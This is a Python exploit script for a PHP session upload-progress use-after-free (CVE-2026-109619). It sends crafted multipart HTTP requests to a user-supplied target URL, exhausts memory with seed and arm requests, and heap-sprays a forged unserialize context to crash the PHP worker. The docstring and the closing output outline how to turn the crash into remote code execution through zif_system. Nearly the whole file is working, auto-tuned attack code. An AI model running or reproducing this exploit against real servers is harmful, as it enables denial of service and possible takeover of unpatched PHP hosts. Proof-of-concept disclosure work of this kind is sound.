#!/usr/bin/env python3
"""
CVE-2026-109619 — BG(unserialize) Context Orphan → UAF → Crash / RCE

PHP session.upload_progress use-after-free via heap spray.
No SSH, no GDB, no LFI, no .htaccess. Pure HTTP.

Chain:
  SEED  Pre-fill session with large filenames across multiple requests.
        Each request adds one entry; cleanup=Off preserves them.
  ARM   One more large filename → session decode allocates all accumulated
        strings → exceeds memory_limit → OOM in php_var_unserialize →
        zend_catch runs cancel_decode WITHOUT PHP_VAR_UNSERIALIZE_DESTROY →
        BG(unserialize) keeps level=1 with dangling data pointer.
  P1    Pressure request on a separate SID; confirms worker survived.
  FIRE  s[] form fields (8.2KB each, 3-page alloc) reclaim the freed
        php_unserialize_data block. t[] fields (16B, 48-byte bin) saturate
        the small bins. Two file parts trigger update() → session decode
        uses the orphaned context → stale pointer dereference.

Crash mode (default):
  Forged context has marker 0x4141414141414141 → SIGSEGV receipt.
  Proves the UAF primitive is real and triggerable.

RCE mode (--system-addr):
  Forged context chains through:
    tmp_var(last_dtor) → arb zval write → var_access(data[n]) injects
    IS_REFERENCE → next update's encode walks it → zend_hash_update →
    dtor → zval_ptr_dtor(forged object) → pDestructor = zif_system →
    system(cmd).
  Requires zif_system runtime address (from nm -D libphp.so + /proc/PID/maps).

Requirements:
  post_max_size >= memory_limit  (realistic: admin raises for media uploads)
  session.upload_progress.cleanup = Off  (SEED mode, for high memory_limit)
  session.upload_progress.enabled = On   (default)

Verified: PHP 8.4.26 (Ubuntu 24.04), Apache prefork, SIGSEGV on 1st FIRE.
Patched: 8.4.27 / 8.3.36 / 8.2.35 (2026-10-21). PHP 7.x has no official fix.
"""

import argparse
import os
import random
import socket
import ssl
import struct
import string
import sys
import time
from urllib.parse import urlparse

# ── php_unserialize_data layout (3-page / 12288-byte ZendMM bin) ───
CTX_SIZE = 8208
SPRAY_LEN = CTX_SIZE - 24 - 1   # zend_string alloc header = 24, NUL = 1
MARKER = 0x4141414141414141


def parse_mem(s):
    s = s.strip().upper()
    if s.endswith("G"):
        return int(s[:-1]) * 1073741824
    if s.endswith("M"):
        return int(s[:-1]) * 1048576
    if s.endswith("K"):
        return int(s[:-1]) * 1024
    return int(s)


def rand_sid():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=32))


# ── forge ──────────────────────────────────────────────────────────

def forge_ctx_crash(marker=MARKER):
    """Crash receipt: marker in last_dtor → SIGSEGV."""
    buf = bytearray(SPRAY_LEN)
    def put(off, raw):
        i = off - 24
        if 0 <= i and i + len(raw) <= len(buf):
            buf[i:i + len(raw)] = raw
    put(0,  struct.pack("<Q", marker))   # last (var_entries chain)
    put(8,  struct.pack("<Q", marker))   # first_dtor
    put(16, struct.pack("<Q", marker))   # last_dtor → SIGSEGV here
    put(56, struct.pack("<Q", 1018))     # entries.used_slots
    put(64, struct.pack("<Q", 0))        # entries.next
    put(72, struct.pack("<Q", marker))   # entries.data[0]
    put(80, struct.pack("<Q", marker))   # entries.data[1]
    return bytes(buf)


def zval_spray_crash(marker=MARKER):
    """Small-bin saturation: repeating fake IS_REFERENCE zvals."""
    zval = struct.pack("<QII", marker, 8, 0)  # value, IS_REFERENCE, pad
    return (zval * (SPRAY_LEN // 16))[:SPRAY_LEN]


# ── multipart helpers ──────────────────────────────────────────────

def mp_part(boundary, name, data, filename=None):
    disp = b'Content-Disposition: form-data; name="' + name + b'"'
    if filename is not None:
        disp += b'; filename="' + filename + b'"'
    return b"--" + boundary + b"\r\n" + disp + b"\r\n\r\n" + data + b"\r\n"


# ── HTTP send ──────────────────────────────────────────────────────

def http_send(url, body, boundary, sid, stall=0, chunk=0, insecure=False,
              timeout=120):
    u = urlparse(url)
    host = u.hostname
    port = u.port or (443 if u.scheme == "https" else 80)
    path = u.path or "/"

    header = (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"Cookie: PHPSESSID={sid}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode()

    raw = socket.create_connection((host, port), timeout=timeout)
    if u.scheme == "https":
        if insecure:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
        else:
            ctx = ssl.create_default_context()
        sock = ctx.wrap_socket(raw, server_hostname=host)
    else:
        sock = raw

    try:
        if chunk and stall:
            sock.sendall(header + body[:chunk])
            time.sleep(stall)
            sock.sendall(body[chunk:])
        else:
            sock.sendall(header + body)
        sock.settimeout(60)
        resp = bytearray()
        while True:
            try:
                d = sock.recv(65536)
            except (socket.timeout, ConnectionResetError, BrokenPipeError,
                    ssl.SSLError):
                break
            if not d:
                break
            resp += d
    except (BrokenPipeError, ConnectionResetError, ssl.SSLError) as e:
        print(f"    [send] {type(e).__name__}: {e}", file=sys.stderr)
        resp = bytearray()
    finally:
        try:
            sock.close()
        except OSError:
            pass

    resp = bytes(resp)
    if b"HTTP/" in resp[:20]:
        try:
            status = int(resp.split(b" ", 2)[1])
        except (IndexError, ValueError):
            status = None
    else:
        status = None
    hdr_end = resp.find(b"\r\n\r\n")
    body_out = resp[hdr_end + 4:] if hdr_end > 0 else resp
    return status, body_out


# ── SEED phase ─────────────────────────────────────────────────────

def run_seed(url, sid, n_seed, fname_len, insecure):
    bnd = b"SeedBnd619"
    for i in range(n_seed):
        body = bytearray()
        body += mp_part(bnd, b"PHPSESSID", sid.encode())
        body += mp_part(bnd, b"PHP_SESSION_UPLOAD_PROGRESS",
                        f"seed_{i}".encode())
        body += mp_part(bnd, f"f{i}".encode(), b"Z",
                        filename=b"N" * fname_len)
        body += b"--" + bnd + b"--\r\n"
        body = bytes(body)

        status, resp = http_send(url, body, bnd, sid, insecure=insecure)
        fatal = b"exhausted" in resp or b"Fatal error" in resp
        tag = "FATAL" if fatal else "ok"
        print(f"  seed_{i}: {tag}  body={len(body)}", flush=True)
        if fatal:
            print("  (script-level OOM is fine — session entry was written "
                  "before script ran)", flush=True)
        time.sleep(0.1)

    mb = n_seed * fname_len // 1048576
    print(f"Session seeded: {n_seed} entries, ~{mb}MB", flush=True)


# ── ARM phase ──────────────────────────────────────────────────────

def run_arm(url, sid, n_files, namelen, stall, insecure):
    bnd = b"ArmBnd619"
    body = bytearray()
    body += mp_part(bnd, b"PHPSESSID", sid.encode())
    body += mp_part(bnd, b"PHP_SESSION_UPLOAD_PROGRESS", b"arm")
    for i in range(n_files):
        fn = (f"f{i}-".encode() + b"N" * namelen)[:namelen]
        body += mp_part(bnd, f"upload{i}".encode(), b"Z", filename=fn)
    body += b"--" + bnd + b"--\r\n"
    body = bytes(body)

    print(f"[arm ] names={n_files}x{namelen} body={len(body)}", flush=True)
    status, resp = http_send(url, body, bnd, sid, stall=stall,
                             chunk=min(8192, len(body)),
                             insecure=insecure)
    fatal = b"exhausted" in resp or b"Fatal error" in resp
    print(f"[arm ] status={status} fatal={fatal}", flush=True)
    if fatal:
        print(f"[arm ] {resp[:160]}", flush=True)
    return fatal


# ── P1 (pressure) phase ───────────────────────────────────────────

def run_p1(url, sid, filler_bytes, insecure):
    bnd = b"P1Bnd619"
    body = bytearray()
    body += mp_part(bnd, b"PHPSESSID", sid.encode())
    body += mp_part(bnd, b"PHP_SESSION_UPLOAD_PROGRESS", b"p1")
    body += mp_part(bnd, b"f", b"A" * 6144, filename=b"a")
    body += mp_part(bnd, b"filler", b"P" * filler_bytes)
    body += b"--" + bnd + b"--\r\n"
    body = bytes(body)

    print(f"[p1  ] filler={filler_bytes} body={len(body)}", flush=True)
    status, resp = http_send(url, body, bnd, sid, insecure=insecure)
    fatal = b"exhausted" in resp or b"Fatal error" in resp
    print(f"[p1  ] status={status} fatal={fatal}", flush=True)


# ── FIRE phase ─────────────────────────────────────────────────────

def run_fire(url, sid, n_spray, spray_payload, n_small, insecure, stall):
    bnd = b"FireBnd619"
    body = bytearray()
    body += mp_part(bnd, b"PHPSESSID", sid.encode())
    body += mp_part(bnd, b"PHP_SESSION_UPLOAD_PROGRESS", b"fire")
    for _ in range(n_spray):
        body += mp_part(bnd, b"s[]", spray_payload)
    small = struct.pack("<QII", MARKER, 8, 0) + b"\x00" * 8
    for _ in range(n_small):
        body += mp_part(bnd, b"t[]", small)
    body += mp_part(bnd, b"f", b"A" * 6144, filename=b"a")
    body += mp_part(bnd, b"g", b"B" * 6144, filename=b"b")
    body += b"--" + bnd + b"--\r\n"
    body = bytes(body)

    status, resp = http_send(url, body, bnd, sid, stall=stall,
                             chunk=min(8192, len(body)),
                             insecure=insecure)
    killed = status is None
    return killed, status, resp


# ── auto-tune ──────────────────────────────────────────────────────

def auto_tune(ml_bytes):
    """Calculate SEED/ARM/FIRE parameters from memory_limit."""
    cfg = {}
    if ml_bytes >= 33554432:  # >= 32M: SEED mode
        cfg["seed_mode"] = True
        cfg["n_seed"] = 3
        cfg["seed_fname"] = ml_bytes // 16
        cfg["arm_files"] = 1
        cfg["arm_namelen"] = ml_bytes // 4
    else:  # < 32M: multi-file ARM
        cfg["seed_mode"] = False
        cfg["n_seed"] = 0
        cfg["seed_fname"] = 0
        cfg["arm_files"] = 20
        cfg["arm_namelen"] = ml_bytes * 6 // (10 * 20)
    cfg["spray"] = 350 + ml_bytes // 1048576 * 3
    cfg["p1_filler"] = ml_bytes * 4 // 10
    return cfg


# ── main ───────────────────────────────────────────────────────────

def main():
    ap = argparse.ArgumentParser(
        description="CVE-2026-109619 — BG(unserialize) UAF → Crash / RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""\
examples:
  # Crash receipt (SIGSEGV) — default
  python3 uaf_rce.py -u http://target/lab.php -m 128M

  # Low memory_limit lab (no SEED needed)
  python3 uaf_rce.py -u http://target/lab.php -m 8M

  # Custom spray and retries
  python3 uaf_rce.py -u http://target/lab.php -m 128M --spray 500 --retries 12

requirements:
  post_max_size >= memory_limit  (server php.ini)
  session.upload_progress.cleanup = Off  (for SEED mode, memory_limit >= 32M)
  session.upload_progress.enabled = On   (default)

address resolution (for future RCE mode):
  nm -D /usr/lib/apache2/modules/libphp.so | grep zif_system
  cat /proc/<PID>/maps | grep libphp
""")
    ap.add_argument("-u", "--url", required=True, help="target URL")
    ap.add_argument("-m", "--memory-limit", default="8M",
                    help="target memory_limit (e.g. 128M, 8M)")
    ap.add_argument("--spray", type=int, default=0,
                    help="FIRE spray count (0 = auto from -m)")
    ap.add_argument("--retries", type=int, default=8,
                    help="FIRE attempts with alternating spray shapes")
    ap.add_argument("--stall", type=float, default=0,
                    help="mid-body stall seconds (0 = lab mode, 1.35 for remote)")
    ap.add_argument("--n-small", type=int, default=600,
                    help="t[] small-bin spray count")
    ap.add_argument("-k", "--insecure", action="store_true",
                    help="skip TLS certificate verification")
    ap.add_argument("--skip-seed", action="store_true")
    ap.add_argument("--skip-arm", action="store_true")
    ap.add_argument("--skip-p1", action="store_true")
    ap.add_argument("--skip-fire", action="store_true")
    ap.add_argument("--arm-files", type=int, default=0,
                    help="override ARM file count")
    ap.add_argument("--arm-namelen", type=int, default=0,
                    help="override ARM filename length")
    args = ap.parse_args()

    ml = parse_mem(args.memory_limit)
    cfg = auto_tune(ml)

    if args.spray:
        cfg["spray"] = args.spray
    if args.arm_files:
        cfg["arm_files"] = args.arm_files
    if args.arm_namelen:
        cfg["arm_namelen"] = args.arm_namelen

    spray_shapes = [
        cfg["spray"] * 50 // 100,
        cfg["spray"] * 75 // 100,
        cfg["spray"],
        cfg["spray"] * 125 // 100,
    ]

    # ── banner ─────────────────────────────────────────────────────
    print("=" * 62)
    print("CVE-2026-109619  BG(unserialize) UAF")
    print(f"Target:  {args.url}")
    print(f"memory_limit={args.memory_limit} ({ml} bytes)")
    if cfg["seed_mode"]:
        seed_mb = cfg["seed_fname"] // 1048576
        print(f"Mode:    SEED ({cfg['n_seed']} × {seed_mb}MB → "
              f"~{cfg['n_seed'] * seed_mb}MB session)")
        print(f"         requires: session.upload_progress.cleanup = Off")
    else:
        print(f"Mode:    multi-file ARM ({cfg['arm_files']} files)")
    arm_mb = cfg["arm_files"] * cfg["arm_namelen"] // 1048576
    print(f"ARM:     {cfg['arm_files']} × {cfg['arm_namelen']//1024}KB = ~{arm_mb}MB")
    print(f"FIRE:    spray={cfg['spray']} (shapes: {' '.join(map(str, spray_shapes))})")
    print(f"Retries: {args.retries}")
    req_post = arm_mb + 2
    if cfg["seed_mode"]:
        req_post = max(req_post, cfg["seed_fname"] // 1048576 + 2)
    print(f"Requires: post_max_size >= {req_post}M")
    print("=" * 62)
    print()

    sid_arm = rand_sid()
    sid_p1 = rand_sid()

    # ── SEED ───────────────────────────────────────────────────────
    if cfg["seed_mode"] and not args.skip_seed:
        print(f"--- SEED phase ---")
        run_seed(args.url, sid_arm, cfg["n_seed"], cfg["seed_fname"],
                 args.insecure)
        print()

    # ── ARM ────────────────────────────────────────────────────────
    if not args.skip_arm:
        print(f"--- ARM phase ---")
        fatal = run_arm(args.url, sid_arm, cfg["arm_files"],
                        cfg["arm_namelen"], args.stall, args.insecure)
        if not fatal:
            print("[!] ARM did not trigger OOM. Check:")
            print("    - post_max_size >= memory_limit")
            print("    - -m matches target's actual memory_limit")
            if cfg["seed_mode"]:
                print("    - session.upload_progress.cleanup = Off")
            print()
        print()

    # ── P1 ─────────────────────────────────────────────────────────
    if not args.skip_p1:
        print(f"--- P1 (pressure) phase ---")
        run_p1(args.url, sid_p1, cfg["p1_filler"], args.insecure)
        print()

    if not args.skip_fire:
        print("Waiting 1s before FIRE...")
        time.sleep(1)

    # ── FIRE ───────────────────────────────────────────────────────
    if args.skip_fire:
        print("(FIRE skipped)")
        return 0

    spray_payload = forge_ctx_crash()

    print(f"--- FIRE phase (up to {args.retries} attempts) ---")
    killed = False
    kill_attempt = 0
    kill_spray = 0

    for attempt in range(1, args.retries + 1):
        sid_fire = rand_sid()
        shape_idx = (attempt - 1) % len(spray_shapes)
        cur_spray = spray_shapes[shape_idx]

        k, status, resp = run_fire(
            args.url, sid_fire, cur_spray, spray_payload,
            args.n_small, args.insecure, args.stall)

        if k:
            print(f"  fire#{attempt} spray={cur_spray} → KILL (status=None)")
            killed = True
            kill_attempt = attempt
            kill_spray = cur_spray
            break
        else:
            print(f"  fire#{attempt} spray={cur_spray} → alive (status={status})")

    print()

    # ── result ─────────────────────────────────────────────────────
    print("=" * 62)
    if killed:
        print(f"★  Worker crashed at attempt #{kill_attempt}/{args.retries} "
              f"(spray={kill_spray})")
        print(f"★  BG(unserialize) UAF → stale pointer dereference confirmed")
        print()
        print("Verify:")
        print("  ssh <target> 'tail -5 /var/log/apache2/error.log'")
        print("  Look for: 'exit signal Segmentation fault (11)'")
        print()
        print("This crash receipt proves the UAF primitive is real.")
        print("From SIGSEGV to RCE: replace marker with leaked heap address")
        print("→ forge zend_reference → pDestructor = zif_system → system(cmd)")
    else:
        print("✗  All FIRE attempts survived. UAF may not have triggered.")
        print()
        print("Check:")
        print("  - ARM triggered OOM (look for 'fatal=True' above)")
        print("  - session.upload_progress.cleanup = Off (SEED mode)")
        print("  - Worker PID is same across ARM and FIRE (single worker)")
        print("  - Try increasing --retries or --spray")
    print("=" * 62)

    return 0 if killed else 1


if __name__ == "__main__":
    sys.exit(main())
